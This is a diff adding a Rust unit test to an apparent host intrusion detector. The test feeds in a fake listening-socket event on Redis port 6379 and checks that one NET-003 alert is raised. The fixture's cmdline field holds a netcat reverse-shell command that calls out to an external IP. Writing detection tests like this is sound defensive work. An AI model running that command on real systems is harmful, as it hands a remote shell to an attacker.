@@ -122,6 +122,24 @@ fn reports_high_risk_public_port_from_current_state() {
 }
 
 #[test]
+fn reports_suspicious_process_on_high_risk_port_as_one_behavior_alert() {
+    let findings = detect_with_default_config(vec![RawEvent::new("network", "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", "6379")
+        .with_field("process_name", "sh")
+        .with_field("executable", "/tmp/.x/sh")
+        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+    assert!(findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "service_profile" && item.value == "Redis"));
+}
+
+#[test]
 fn allowlist_suppresses_high_risk_public_port() {
     let mut config = SentinelConfig::default();
     config.allowlist.listening_ports.push(6379);
